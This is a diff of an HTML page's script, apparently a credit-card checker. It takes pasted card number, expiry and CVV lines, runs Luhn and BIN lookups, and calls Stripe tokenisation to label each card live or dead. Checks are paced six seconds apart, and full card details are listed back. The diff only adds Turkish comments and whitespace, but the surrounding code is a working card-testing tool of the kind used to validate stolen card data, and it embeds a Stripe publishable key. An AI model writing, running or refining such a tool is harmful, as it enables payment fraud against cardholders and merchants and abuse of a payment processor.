@@ -95,7 +95,8 @@
   
 <script>  
 const stripe = Stripe('pk_test_51SOarqIXpwqPxiuIhbpCoaV6ramzzUH2fbGfUPS8kHx168JvpyeTJziIU1cp7MgtumjJegGCzEeYZCMameLFJrYw004Iy3I2W8');  
-  
+
+// Luhn Algoritması
 function luhnCheck(cardNumber) {  
     const digits = cardNumber.replace(/\D/g, '').split('').map(Number);  
     let sum = 0, alternate = false;  
@@ -107,7 +108,8 @@ function luhnCheck(cardNumber) {
     }  
     return sum % 10 === 0;  
 }  
-  
+
+// BINLIST.NET API Entegrasyonu  
 async function getBinInfo(bin) {  
     try {  
         const controller = new AbortController();  
@@ -137,7 +139,8 @@ async function getBinInfo(bin) {
         return { brand: "Hata", type: "Hata", bank: "Hata", country: "Hata", flag: "Cross", level: "Hata", prepaid: "Hata" };  
     }  
 }  
-  
+
+// Stripe Kart Doğrulama ve Token Oluşumu
 async function checkWithStripe(number, month, year, cvv) {  
     try {  
         const { token, error } = await stripe.createToken('card', {  
@@ -159,22 +162,23 @@ async function checkWithStripe(number, month, year, cvv) {
         return { valid: false, message: "Stripe API hatası: " + e.message };  
     }  
 }  
-  
+
 let liveCards = [], deadCards = [], total = 0, checked = 0;  
-  
+
+// Kartları Kontrol Etme
 async function checkCard(cardLine) {  
     const [number, month, year, cvv] = cardLine.split('|').map(s => s.trim());  
     if (!number || !/^\d{13,19}$/.test(number)) return;  
-  
+
     const bin = number.substring(0, 6);  
     const isLuhn = luhnCheck(number);  
-  
+
     const binInfo = await getBinInfo(bin);  
-  
+
     const stripeResult = await checkWithStripe(number, month, year, cvv);  
-  
+
     const isLive = isLuhn && stripeResult.valid === true;  
-  
+
     const result = {  
         number, month, year, cvv, bin,  
         brand: stripeResult.brand || binInfo.brand,  
@@ -191,17 +195,18 @@ async function checkCard(cardLine) {
         last4: stripeResult.last4 || "",  
         status: isLive ? "CANLI" : "ÖLÜ"  
     };  
-  
+
     if (isLive) liveCards.push(result);  
     else deadCards.push(result);  
-  
+
     checked++;  
     document.getElementById('progress').textContent = `${checked} / ${total}`;  
     updateResults();  
-  
+
     await new Promise(r => setTimeout(r, 6000));  
 }  
-  
+
+// Sonuçları Güncelleme
 function updateResults() {  
     const liveList = document.getElementById('live-list');  
     liveList.innerHTML = '';  
@@ -216,7 +221,7 @@ function updateResults() {
     document.getElementById('live-count').textContent = liveCards.length;  
     document.getElementById('live-total').textContent = liveCards.length;  
     if (liveCards.length > 0) document.getElementById('live-actions').style.display = 'flex';  
-  
+
     const deadList = document.getElementById('dead-list');  
     deadList.innerHTML = '';  
     deadCards.forEach(c => {  
@@ -230,7 +235,7 @@ function updateResults() {
     document.getElementById('dead-count').textContent = deadCards.length;  
     document.getElementById('dead-total').textContent = deadCards.length;  
     if (deadCards.length > 0) document.getElementById('dead-actions').style.display = 'flex';  
-  
+
     const details = document.getElementById('detailed-results');  
     details.innerHTML = '';  
     [...liveCards, ...deadCards].forEach(c => {  
@@ -238,8 +243,8 @@ function updateResults() {
         div.className = `result ${c.status === 'ÖLÜ' ? 'dead' : ''}`;  
         div.innerHTML = `<b>${c.number}|${c.month}|${c.year}|${c.cvv}</b><br>  
                          BİN: ${c.bin} | ${c.brand} ${c.type} (${c.level}) | ${c.bank}<br>  
-                         ${c.country} ${c.flag} | Luhn: ${c.luhn} | Stripe: ${c.stripeValid}<br>  
-                        ${c.token ? 'Token: ' + c.token : 'Hata: ' + c.stripeMessage} → <b>${c.status}</b>`;  
+                       ${c.country} ${c.flag} | Luhn: ${c.luhn} | Stripe: ${c.stripeValid}<br>  
+                         ${c.token ? 'Token: ' + c.token : 'Hata: ' + c.stripeMessage} → <b>${c.status}</b>`;  
         details.appendChild(div);  
     });  
   
@@ -288,4 +293,4 @@ async function startCheck() {
 }  
 </script>  
 </body>  
-</html>
+</html> 
